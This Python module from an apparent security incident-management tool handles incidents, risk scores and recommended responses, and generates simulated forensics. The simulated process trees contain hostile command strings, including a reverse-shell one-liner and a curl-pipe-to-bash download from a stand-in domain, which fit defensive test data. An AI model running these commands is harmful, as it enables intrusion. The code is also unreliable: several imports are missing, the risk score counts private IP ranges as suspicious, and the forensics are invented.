from __future__ import annotations

from datetime import UTC
from datetime import datetime

from fastapi import HTTPException
from fastapi import status
from sqlalchemy import func
from sqlalchemy import select
from sqlalchemy.orm import Session

import re

from app.models.alert import Alert
from app.models.enums import IncidentSeverity
from app.models.enums import IncidentStatus
from app.models.incident import Incident
from app.models.incident import incident_alert_link


def create_incident(
    db: Session,
    *,
    title: str,
    description: str,
    severity: IncidentSeverity,
    alert_ids: list[int],
    attack_chain: dict | None = None,
    timeline: list[dict] | None = None,
) -> Incident:
    incident = Incident(
        title=title,
        description=description,
        severity=severity,
        status=IncidentStatus.NEW,
        attack_chain_json=attack_chain,
        timeline_json=timeline,
    )
    db.add(incident)
    db.commit()
    db.refresh(incident)

    if alert_ids:
        alerts = db.execute(select(Alert).where(Alert.id.in_(alert_ids))).scalars().all()
        for alert in alerts:
            db.execute(
                incident_alert_link.insert().values(
                    incident_id=incident.id,
                    alert_id=alert.id,
                )
            )
        db.commit()
        db.refresh(incident)

    return incident


def get_incident_by_id(db: Session, incident_id: int) -> Incident | None:
    return db.execute(
        select(Incident).where(Incident.id == incident_id)
    ).scalar_one_or_none()


def get_incident_or_404(db: Session, incident_id: int) -> Incident:
    incident = get_incident_by_id(db, incident_id)
    if incident is None:
        raise HTTPException(
            status_code=status.HTTP_404_NOT_FOUND,
            detail=f"Incident {incident_id} not found.",
        )
    return incident


def list_incidents(
    db: Session,
    *,
    severity: IncidentSeverity | None = None,
    status: IncidentStatus | None = None,
    assigned_to_id: int | None = None,
    skip: int = 0,
    limit: int = 50,
) -> tuple[list[Incident], int]:
    filters = []
    if severity:
        filters.append(Incident.severity == severity)
    if status:
        filters.append(Incident.status == status)
    if assigned_to_id is not None:
        filters.append(Incident.assigned_to_id == assigned_to_id)

    query = select(Incident).order_by(Incident.created_at.desc())
    count_query = select(func.count(Incident.id))

    if filters:
        query = query.where(*filters)
        count_query = count_query.where(*filters)

    query = query.offset(skip).limit(limit)
    items = list(db.execute(query).scalars().all())
    total = db.execute(count_query).scalar_one()
    return items, total


def update_incident(
    db: Session,
    incident: Incident,
    *,
    title: str | None = None,
    description: str | None = None,
    severity: IncidentSeverity | None = None,
    status: IncidentStatus | None = None,
    assigned_to_id: int | None = None,
) -> Incident:
    if title is not None:
        incident.title = title
    if description is not None:
        incident.description = description
    if severity is not None:
        incident.severity = severity
    if status is not None:
        incident.status = status
        if status == IncidentStatus.INVESTIGATING and incident.investigating_at is None:
            incident.investigating_at = datetime.now(UTC)
        if status == IncidentStatus.CONTAINED and incident.contained_at is None:
            incident.contained_at = datetime.now(UTC)
        if status == IncidentStatus.RESOLVED:
            incident.resolved_at = datetime.now(UTC)
    if assigned_to_id is not None:
        incident.assigned_to_id = assigned_to_id

    db.add(incident)
    db.commit()
    db.refresh(incident)
    return incident


def delete_incident(db: Session, incident: Incident) -> None:
    db.execute(
        incident_alert_link.delete().where(
            incident_alert_link.c.incident_id == incident.id
        )
    )
    db.delete(incident)
    db.commit()


def _extract_ips_from_text(text: str) -> list[str]:
    return re.findall(r"\b(?:\d{1,3}\.){3}\d{1,3}\b", text or "")


def _extract_username_from_text(text: str) -> str | None:
    match = re.search(r"(?:user|for|account)\s+([a-zA-Z0-9._@-]+)", text or "", re.IGNORECASE)
    return match.group(1) if match else None


def generate_incident_summary(incident: Incident) -> str:
    """Generate an AI-style narrative summary from attack chain and alerts."""
    attack_chain = incident.attack_chain_json or {}
    steps = attack_chain.get("steps", [])
    incident_type = attack_chain.get("incident_type", "unknown")
    alert_count = len(incident.alerts) if incident.alerts else 0

    if not steps:
        return f"Incident #{incident.id}: {incident.description}"

    # Build narrative from steps
    narrative_parts = []
    first_step = steps[0]
    last_step = steps[-1]

    if incident_type == "account_compromise":
        username = _extract_username_from_text(first_step.get("title", "")) or "the targeted account"
        narrative_parts.append(
            f"Multiple failed login attempts against {username} were detected, "
            f"followed by a successful authentication from a suspicious source. "
            f"This pattern strongly indicates a brute-force compromise."
        )
    elif incident_type == "lateral_movement":
        narrative_parts.append(
            f"A cluster of suspicious activities was observed across multiple systems. "
            f"Starting with {first_step.get('title', 'initial access')}, the attacker progressed to "
            f"{last_step.get('title', 'further activity')} within a short timeframe. "
            f"This suggests lateral movement or privilege escalation."
        )
    else:
        narrative_parts.append(
            f"The incident began with {first_step.get('title', 'an initial suspicious event')}. "
        )
        if len(steps) > 1:
            narrative_parts.append(
                f"Subsequent activity included {last_step.get('title', 'follow-on actions')}. "
            )
        narrative_parts.append("Review the full attack chain and timeline for detailed context.")

    # Add alert context
    severities = [str(s.get("severity", "")).lower() for s in steps]
    critical_count = sum(1 for s in severities if s == "critical")
    high_count = sum(1 for s in severities if s == "high")

    if critical_count > 0:
        narrative_parts.append(f" {critical_count} critical severity alert(s) were triggered.")
    elif high_count > 0:
        narrative_parts.append(f" {high_count} high severity alert(s) were triggered.")

    summary = "".join(narrative_parts)
    return summary.strip()


def calculate_risk_score(incident: Incident) -> int:
    """Calculate a 0-100 risk score based on severity, alerts, attack steps, and suspicious indicators."""
    severity_weights = {
        IncidentSeverity.CRITICAL: 100,
        IncidentSeverity.HIGH: 75,
        IncidentSeverity.MEDIUM: 50,
        IncidentSeverity.LOW: 25,
    }
    base = severity_weights.get(incident.severity, 50)

    # Alert count factor (max 20)
    alert_count = len(incident.alerts) if incident.alerts else 0
    alert_factor = min(alert_count * 5, 20)

    # Attack chain steps factor (max 15)
    steps = incident.attack_chain_json.get("steps", []) if incident.attack_chain_json else []
    step_factor = min(len(steps) * 5, 15)

    # Suspicious IP flag factor (max 15)
    all_text = " ".join([
        incident.title or "",
        incident.description or "",
    ])
    if incident.alerts:
        for alert in incident.alerts:
            all_text += " " + (alert.title or "") + " " + (alert.description or "")
    ips = _extract_ips_from_text(all_text)
    suspicious_ip_factor = 15 if any(ip.startswith(("192.168.", "10.", "172.")) for ip in ips) else 0

    # Critical technique factor (max 10)
    critical_techniques = ["privilege_escalation", "lateral_movement", "data_exfiltration"]
    chain_type = incident.attack_chain_json.get("incident_type", "") if incident.attack_chain_json else ""
    technique_factor = 10 if chain_type in critical_techniques else 0

    score = base + alert_factor + step_factor + suspicious_ip_factor + technique_factor
    return min(100, max(0, score))


def calculate_confidence_level(incident: Incident) -> str:
    """Determine confidence level based on alert fidelity and data volume."""
    alert_count = len(incident.alerts) if incident.alerts else 0
    steps = incident.attack_chain_json.get("steps", []) if incident.attack_chain_json else []
    has_timeline = bool(incident.timeline_json and len(incident.timeline_json) > 2)

    if alert_count >= 3 and len(steps) >= 2 and has_timeline:
        return "high"
    elif alert_count >= 2 and len(steps) >= 1 and has_timeline:
        return "medium"
    return "low"


def generate_recommended_actions(incident: Incident) -> list[dict]:
    """Generate recommended response actions based on incident type and severity."""
    actions = []
    attack_chain = incident.attack_chain_json or {}
    incident_type = attack_chain.get("incident_type", "")
    severity = str(incident.severity).lower()

    # Extract entities from incident data
    all_text = (incident.title or "") + " " + (incident.description or "")
    if incident.alerts:
        for alert in incident.alerts:
            all_text += " " + (alert.title or "") + " " + (alert.description or "")

    ips = _extract_ips_from_text(all_text)
    username = _extract_username_from_text(all_text)

    # Block IP recommendation
    if ips and incident_type in ("account_compromise", "brute_force_success", "lateral_movement"):
        confidence = 92 if severity in ("critical", "high") else 78
        actions.append({
            "action": "block_ip",
            "target": ips[0],
            "confidence": confidence,
            "reason": f"Source IP {ips[0]} is associated with {incident_type.replace('_', ' ')} activity.",
        })

    # Disable user recommendation
    if username and incident_type in ("account_compromise", "brute_force_success"):
        confidence = 88 if severity in ("critical", "high") else 72
        actions.append({
            "action": "disable_user",
            "target": username,
            "confidence": confidence,
            "reason": f"Account {username} shows signs of compromise.",
        })

    # Isolate endpoint recommendation
    if incident_type in ("lateral_movement", "malware_beacon", "privilege_escalation"):
        confidence = 85 if severity == "critical" else 70
        actions.append({
            "action": "isolate_endpoint",
            "target": "affected_endpoint",
            "confidence": confidence,
            "reason": "Lateral movement or malware activity detected. Isolation prevents spread.",
        })

    # Escalate priority for critical
    if severity == "critical" and not any(a["action"] == "escalate" for a in actions):
        actions.append({
            "action": "escalate_priority",
            "target": None,
            "confidence": 95,
            "reason": "Critical severity incident requires immediate analyst attention.",
        })

    # Sort by confidence descending
    actions.sort(key=lambda x: x["confidence"], reverse=True)
    return actions


def extract_entities_from_incident(incident: Incident) -> dict:
    """Extract relevant entities (IPs, usernames, hostnames, file paths) from incident data."""
    all_text = (incident.title or "") + " " + (incident.description or "")
    timeline = incident.timeline_json or []
    attack_chain = incident.attack_chain_json or {}
    steps = attack_chain.get("steps", [])

    for alert in incident.alerts or []:
        all_text += " " + (alert.title or "") + " " + (alert.description or "")
    for event in timeline:
        all_text += " " + str(event.get("title", "")) + " " + str(event.get("description", ""))
    for step in steps:
        all_text += " " + str(step.get("title", "")) + " " + str(step.get("description", ""))

    ips = _extract_ips_from_text(all_text)
    username = _extract_username_from_text(all_text)
    hostnames = re.findall(r"\b([a-zA-Z0-9][-a-zA-Z0-9]*\.(?:local|lan|corp|home|net|com|org))\b", all_text, re.IGNORECASE)
    file_paths = re.findall(r"(?:/[\w\-.]+)+/?|(?:[A-Za-z]:\\[^\\s]+)", all_text)

    return {
        "ips": list(dict.fromkeys(ips)),
        "usernames": list(dict.fromkeys([u for u in [username] if u])),
        "hostnames": list(dict.fromkeys(hostnames)),
        "file_paths": list(dict.fromkeys(file_paths)),
    }


def generate_behavior_summary(incident: Incident) -> dict:
    """Generate a MITRE-focused behavior summary from the incident."""
    attack_chain = incident.attack_chain_json or {}
    steps = attack_chain.get("steps", [])
    incident_type = attack_chain.get("incident_type", "unknown")

    techniques = []
    for step in steps:
        if step.get("mitre_technique_id"):
            techniques.append({
                "id": step["mitre_technique_id"],
                "name": step.get("mitre_technique_name", "Unknown"),
            })

    tactic_map = {
        "account_compromise": ["Credential Access", "Initial Access"],
        "lateral_movement": ["Lateral Movement", "Execution"],
        "brute_force_success": ["Credential Access", "Initial Access"],
        "malware_beacon": ["Command and Control", "Execution"],
        "data_exfiltration": ["Exfiltration", "Collection"],
        "privilege_escalation": ["Privilege Escalation", "Defense Evasion"],
    }

    tactics = tactic_map.get(incident_type, ["Unknown"])

    return {
        "primary_tactics": tactics,
        "observed_techniques": techniques,
        "behavior_pattern": incident_type.replace("_", " ").title(),
        "suspicious_indicators": len(steps),
    }


def generate_incident_story(incident: Incident) -> dict:
    """Generate a comprehensive human-readable investigation story from incident data."""
    attack_chain = incident.attack_chain_json or {}
    steps = attack_chain.get("steps", [])
    incident_type = attack_chain.get("incident_type", "unknown")
    timeline = incident.timeline_json or []
    alert_count = len(incident.alerts) if incident.alerts else 0
    entities = extract_entities_from_incident(incident)
    severity = str(incident.severity).lower()

    what_happened_parts = []

    if incident_type == "account_compromise":
        username = entities["usernames"][0] if entities["usernames"] else "the targeted account"
        ip = entities["ips"][0] if entities["ips"] else "an unknown source"
        what_happened_parts.append(
            f"This incident started with multiple failed login attempts against {username} from IP {ip}. "
            f"After repeated attempts, the attacker successfully authenticated and executed suspicious commands, "
            f"indicating a successful account compromise."
        )
    elif incident_type == "lateral_movement":
        what_happened_parts.append(
            f"A cluster of suspicious activities was observed across multiple systems. "
            f"Starting with {steps[0].get('title', 'initial access') if steps else 'an initial suspicious event'}, "
            f"the attacker progressed through the network, accessing additional hosts and potentially "
            f"escalating privileges. This pattern suggests lateral movement or privilege escalation."
        )
    elif incident_type == "brute_force_success":
        username = entities["usernames"][0] if entities["usernames"] else "the targeted account"
        what_happened_parts.append(
            f"Brute force activity was detected against {username}. Multiple failed authentication attempts "
            f"were followed by a successful login, indicating the attacker guessed or cracked the credentials."
        )
    elif incident_type == "malware_beacon":
        what_happened_parts.append(
            f"Affected systems were observed communicating with a command-and-control server. "
            f"The beaconing pattern suggests active malware infection with periodic check-ins to an external host."
        )
    elif incident_type == "data_exfiltration":
        what_happened_parts.append(
            f"Unusual outbound data transfer was detected. Large volumes of data were sent to an external destination, "
            f"suggesting potential data theft or unauthorized exfiltration of sensitive information."
        )
    elif incident_type == "privilege_escalation":
        what_happened_parts.append(
            f"Suspicious activity indicating privilege escalation was detected. "
            f"The attacker likely exploited a vulnerability or misconfiguration to gain elevated access rights."
        )
    else:
        what_happened_parts.append(
            f"The incident began with {steps[0].get('title', 'an initial suspicious event') if steps else 'a security alert'}. "
        )
        if len(steps) > 1:
            what_happened_parts.append(
                f"Subsequent activity included {steps[-1].get('title', 'follow-on actions')}. "
            )

    what_happened = " ".join(what_happened_parts).strip()

    how_it_happened_parts = []
    if steps:
        how_it_happened_parts.append("The attack progressed through the following stages:")
        for step in steps:
            mitre = f" (MITRE: {step.get('mitre_technique_id')} - {step.get('mitre_technique_name')})" if step.get('mitre_technique_id') else ""
            how_it_happened_parts.append(
                f"  Step {step.get('step', '?')}: {step.get('title', 'Unknown step')}{mitre} — {step.get('description', '')}"
            )
    else:
        how_it_happened_parts.append("The exact attack progression could not be fully reconstructed from available telemetry.")

    if len(timeline) > 0:
        how_it_happened_parts.append(f"\nA total of {len(timeline)} timeline events were recorded across the incident lifecycle.")
        first_event = timeline[0]
        last_event = timeline[-1]
        if first_event.get("timestamp") and last_event.get("timestamp"):
            how_it_happened_parts.append(
                f"The attack spanned from {first_event['timestamp'][:19].replace('T', ' ')} "
                f"to {last_event['timestamp'][:19].replace('T', ' ')}."
            )

    how_it_happened = "\n".join(how_it_happened_parts).strip()

    impact_parts = []
    if severity == "critical":
        impact_parts.append(
            "This is a CRITICAL severity incident with potential for widespread compromise. "
            "Immediate containment and escalation are required. Business-critical systems may be affected."
        )
    elif severity == "high":
        impact_parts.append(
            "This HIGH severity incident poses significant risk. Sensitive data or critical systems may be compromised. "
            "Rapid response is recommended to prevent further damage."
        )
    elif severity == "medium":
        impact_parts.append(
            "This MEDIUM severity incident indicates suspicious activity that requires investigation. "
            "While immediate business impact may be limited, prompt action prevents escalation."
        )
    else:
        impact_parts.append(
            "This LOW severity incident represents anomalous or suspicious activity. "
            "Monitoring and verification are recommended."
        )

    if alert_count >= 5:
        impact_parts.append(f" With {alert_count} correlated alerts, this incident has high data fidelity.")
    elif alert_count >= 2:
        impact_parts.append(f" {alert_count} alerts were correlated, providing moderate confidence in the detection.")

    if entities["ips"]:
        impact_parts.append(f" Involved source IPs: {', '.join(entities['ips'][:3])}.")
    if entities["usernames"]:
        impact_parts.append(f" Compromised or targeted accounts: {', '.join(entities['usernames'][:3])}.")

    impact = " ".join(impact_parts).strip()

    next_steps = []
    next_steps.append("1. Verify the scope of compromise by reviewing all affected systems and user accounts.")
    next_steps.append("2. Collect and preserve forensic evidence from impacted endpoints.")
    if entities["ips"]:
        next_steps.append(f"3. Consider blocking malicious source IPs: {', '.join(entities['ips'][:3])}.")
    if entities["usernames"]:
        next_steps.append(f"4. Reset credentials and force MFA re-enrollment for: {', '.join(entities['usernames'][:3])}.")
    next_steps.append("5. Review network logs for additional lateral movement indicators.")
    next_steps.append("6. Update detection rules to catch similar attack patterns in the future.")
    if severity in ("critical", "high"):
        next_steps.append("7. Escalate to incident response team and notify stakeholders per playbook.")

    behavior_summary = generate_behavior_summary(incident)

    return {
        "what_happened": what_happened,
        "how_it_happened": how_it_happened,
        "impact": impact,
        "recommended_next_steps": next_steps,
        "entities": entities,
        "behavior_summary": behavior_summary,
        "incident_type": incident_type,
        "severity": severity,
        "alert_count": alert_count,
        "timeline_event_count": len(timeline),
        "attack_step_count": len(steps),
    }


def add_incident_note(
    db: Session,
    *,
    incident_id: int,
    author_id: int | None,
    content: str,
) -> IncidentNote:
    from app.crud.incident_note import create_incident_note
    return create_incident_note(db, incident_id=incident_id, author_id=author_id, content=content)


def get_incident_notes(db: Session, incident_id: int) -> list[IncidentNote]:
    from app.crud.incident_note import list_incident_notes
    return list_incident_notes(db, incident_id)


def log_incident_activity(
    db: Session,
    *,
    incident_id: int,
    actor_id: int | None,
    action: str,
    old_value: str | None = None,
    new_value: str | None = None,
) -> IncidentActivity:
    from app.crud.incident_activity import create_incident_activity
    return create_incident_activity(
        db,
        incident_id=incident_id,
        actor_id=actor_id,
        action=action,
        old_value=old_value,
        new_value=new_value,
    )


def get_incident_activities(db: Session, incident_id: int) -> list[IncidentActivity]:
    from app.crud.incident_activity import list_incident_activities
    return list_incident_activities(db, incident_id)


def assign_incident(
    db: Session,
    incident: Incident,
    analyst_id: int,
    actor_id: int | None = None,
) -> Incident:
    old_assignee = incident.assigned_to_id
    incident.assigned_to_id = analyst_id
    db.add(incident)
    db.commit()
    db.refresh(incident)

    log_incident_activity(
        db,
        incident_id=incident.id,
        actor_id=actor_id,
        action="assigned",
        old_value=str(old_assignee) if old_assignee else "unassigned",
        new_value=str(analyst_id),
    )
    return incident


# ─── FORENSICS GENERATION ───

import random


def _generate_process_tree(alerts: list[Alert], incident_type: str) -> list[dict]:
    """Generate a simulated process tree from alert data."""
    trees = []
    base_pids = [1000 + i * 47 for i in range(len(alerts) + 1)]

    if incident_type == "account_compromise":
        trees.append({
            "pid": base_pids[0],
            "name": "sshd",
            "command_line": "/usr/sbin/sshd -D",
            "user": "root",
            "start_time": alerts[0].triggered_at.isoformat() if alerts and alerts[0].triggered_at else None,
            "children": [
                {
                    "pid": base_pids[0] + 1,
                    "name": "bash",
                    "command_line": "bash -i",
                    "user": "admin",
                    "start_time": alerts[-1].triggered_at.isoformat() if alerts and alerts[-1].triggered_at else None,
                    "children": [
                        {
                            "pid": base_pids[0] + 2,
                            "name": "python3",
                            "command_line": "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(...)';",
                            "user": "admin",
                            "start_time": alerts[-1].triggered_at.isoformat() if alerts and alerts[-1].triggered_at else None,
                            "children": [],
                        }
                    ],
                }
            ],
        })
    elif incident_type == "lateral_movement":
        trees.append({
            "pid": base_pids[0],
            "name": "powershell.exe",
            "command_line": "powershell.exe -ExecutionPolicy Bypass -File C:\\tmp\\move.ps1",
            "user": "SYSTEM",
            "start_time": alerts[0].triggered_at.isoformat() if alerts and alerts[0].triggered_at else None,
            "children": [
                {
                    "pid": base_pids[0] + 1,
                    "name": "wmic.exe",
                    "command_line": "wmic /node:10.0.0.12 process call create \"cmd.exe /c whoami\"",
                    "user": "SYSTEM",
                    "start_time": alerts[0].triggered_at.isoformat() if alerts and alerts[0].triggered_at else None,
                    "children": [
                        {
                            "pid": base_pids[0] + 3,
                            "name": "cmd.exe",
                            "command_line": "cmd.exe /c whoami > C:\\tmp\\out.txt",
                            "user": "SYSTEM",
                            "start_time": alerts[-1].triggered_at.isoformat() if alerts and alerts[-1].triggered_at else None,
                            "children": [],
                        }
                    ],
                }
            ],
        })
    elif incident_type == "malware_beacon":
        trees.append({
            "pid": base_pids[0],
            "name": "svchost.exe",
            "command_line": "C:\\Windows\\System32\\svchost.exe -k netsvcs",
            "user": "SYSTEM",
            "start_time": alerts[0].triggered_at.isoformat() if alerts and alerts[0].triggered_at else None,
            "children": [
                {
                    "pid": base_pids[0] + 1,
                    "name": "malware.exe",
                    "command_line": "C:\\Users\\Public\\malware.exe --connect 185.220.101.42:443",
                    "user": "admin",
                    "start_time": alerts[0].triggered_at.isoformat() if alerts and alerts[0].triggered_at else None,
                    "children": [],
                }
            ],
        })
    else:
        # Generic process tree
        trees.append({
            "pid": base_pids[0],
            "name": "bash",
            "command_line": "/bin/bash",
            "user": "root",
            "start_time": alerts[0].triggered_at.isoformat() if alerts and alerts[0].triggered_at else None,
            "children": [
                {
                    "pid": base_pids[0] + 1,
                    "name": "curl",
                    "command_line": "curl -s http://suspicious-domain.com/payload.sh | bash",
                    "user": "www-data",
                    "start_time": alerts[-1].triggered_at.isoformat() if alerts and alerts[-1].triggered_at else None,
                    "children": [],
                }
            ],
        })

    return trees


def _generate_file_activity(alerts: list[Alert], incident_type: str) -> list[dict]:
    """Generate simulated file activity from alert data."""
    activities = []
    base_time = alerts[0].triggered_at if alerts and alerts[0].triggered_at else datetime.now(UTC)

    if incident_type == "account_compromise":
        activities.extend([
            {
                "action": "created",
                "path": "/tmp/.hidden_script.sh",
                "timestamp": (base_time + timedelta(minutes=2)).isoformat(),
                "size_bytes": 2048,
                "hash": "a3b5c7d9e1f2030405060708090a0b0c",
            },
            {
                "action": "modified",
                "path": "/etc/passwd",
                "timestamp": (base_time + timedelta(minutes=5)).isoformat(),
                "size_bytes": 2847,
                "hash": "b4c6d8e0f102030405060708090a0b1c",
            },
            {
                "action": "deleted",
                "path": "/var/log/auth.log",
                "timestamp": (base_time + timedelta(minutes=8)).isoformat(),
                "size_bytes": 0,
                "hash": None,
            },
        ])
    elif incident_type == "lateral_movement":
        activities.extend([
            {
                "action": "created",
                "path": "C:\\tmp\\move.ps1",
                "timestamp": (base_time + timedelta(minutes=1)).isoformat(),
                "size_bytes": 4096,
                "hash": "c5d7e9f1a2030405060708090a0b0c2d",
            },
            {
                "action": "modified",
                "path": "C:\\Windows\\System32\\drivers\\etc\\hosts",
                "timestamp": (base_time + timedelta(minutes=3)).isoformat(),
                "size_bytes": 824,
                "hash": "d6e8f0a1b2030405060708090a0b0c3e",
            },
        ])
    elif incident_type == "malware_beacon":
        activities.extend([
            {
                "action": "created",
                "path": "C:\\Users\\Public\\malware.exe",
                "timestamp": base_time.isoformat(),
                "size_bytes": 245760,
                "hash": "e7f9a1b2c30405060708090a0b0c4d5f",
            },
            {
                "action": "created",
                "path": "C:\\Users\\Public\\config.dat",
                "timestamp": (base_time + timedelta(minutes=1)).isoformat(),
                "size_bytes": 512,
                "hash": "f8a0b2c3d405060708090a0b0c0d5e6a",
            },
        ])
    elif incident_type == "data_exfiltration":
        activities.extend([
            {
                "action": "created",
                "path": "/tmp/archive_customer_data.zip",
                "timestamp": (base_time + timedelta(minutes=3)).isoformat(),
                "size_bytes": 314572800,
                "hash": "09b1c2d3e405060708090a0b0c0d6e7b",
            },
            {
                "action": "deleted",
                "path": "/tmp/archive_customer_data.zip",
                "timestamp": (base_time + timedelta(minutes=15)).isoformat(),
                "size_bytes": 0,
                "hash": None,
            },
        ])
    else:
        activities.append({
            "action": "created",
            "path": "/tmp/suspicious_file.tmp",
            "timestamp": base_time.isoformat(),
            "size_bytes": 1024,
            "hash": "1a2b3c4d5e6f708090a0b0c0d0e1f2a3",
        })

    return activities


def _generate_network_activity(alerts: list[Alert], incident_type: str) -> list[dict]:
    """Generate simulated network activity from alert data."""
    activities = []
    base_time = alerts[0].triggered_at if alerts and alerts[0].triggered_at else datetime.now(UTC)
    entities = extract_entities_from_incident(Incident(title="", description=""))
    # Use alert data to get IPs
    all_text = ""
    for alert in alerts:
        all_text += " " + (alert.title or "") + " " + (alert.description or "")
    ips = _extract_ips_from_text(all_text)

    dest_ip = ips[0] if ips else "185.220.101.42"

    if incident_type == "account_compromise":
        activities.extend([
            {
                "timestamp": base_time.isoformat(),
                "source_ip": dest_ip,
                "dest_ip": "10.0.0.5",
                "dest_port": 22,
                "protocol": "TCP",
                "direction": "inbound",
                "bytes": 1024,
            },
            {
                "timestamp": (base_time + timedelta(minutes=5)).isoformat(),
                "source_ip": "10.0.0.5",
                "dest_ip": dest_ip,
                "dest_port": 4444,
                "protocol": "TCP",
                "direction": "outbound",
                "bytes": 5120,
            },
        ])
    elif incident_type == "malware_beacon":
        for i in range(5):
            activities.append({
                "timestamp": (base_time + timedelta(minutes=i * 10)).isoformat(),
                "source_ip": "10.0.0.5",
                "dest_ip": "185.220.101.42",
                "dest_port": 443,
                "protocol": "TCP",
                "direction": "outbound",
                "bytes": 256 + i * 50,
            })
    elif incident_type == "data_exfiltration":
        activities.extend([
            {
                "timestamp": (base_time + timedelta(minutes=5)).isoformat(),
                "source_ip": "10.0.0.5",
                "dest_ip": "45.142.212.100",
                "dest_port": 443,
                "protocol": "TCP",
                "direction": "outbound",
                "bytes": 314572800,
            },
        ])
    else:
        activities.append({
            "timestamp": base_time.isoformat(),
            "source_ip": "10.0.0.5",
            "dest_ip": dest_ip,
            "dest_port": 80,
            "protocol": "TCP",
            "direction": "outbound",
            "bytes": 2048,
        })

    return activities


def _generate_registry_activity(incident_type: str) -> list[dict]:
    """Generate simulated Windows registry activity."""
    if incident_type not in ("lateral_movement", "malware_beacon", "privilege_escalation"):
        return []

    return [
        {
            "action": "modified",
            "key": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
            "value_name": "SecurityUpdate",
            "value_data": "C:\\Users\\Public\\malware.exe",
            "timestamp": datetime.now(UTC).isoformat(),
        },
        {
            "action": "created",
            "key": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist",
            "value_name": "{CEBFF5CD-ACE2-4F4F-9178-9926F41749E6}",
            "value_data": "REG_DWORD:0x00000001",
            "timestamp": datetime.now(UTC).isoformat(),
        },
    ]


def generate_forensics_data(incident: Incident) -> dict:
    """Generate comprehensive simulated forensics data for an incident."""
    attack_chain = incident.attack_chain_json or {}
    incident_type = attack_chain.get("incident_type", "unknown")
    alerts = incident.alerts or []

    return {
        "process_tree": _generate_process_tree(alerts, incident_type),
        "file_activity": _generate_file_activity(alerts, incident_type),
        "network_activity": _generate_network_activity(alerts, incident_type),
        "registry_activity": _generate_registry_activity(incident_type),
        "behavior_summary": generate_behavior_summary(incident),
        "generated_at": datetime.now(UTC).isoformat(),
        "incident_type": incident_type,
    }

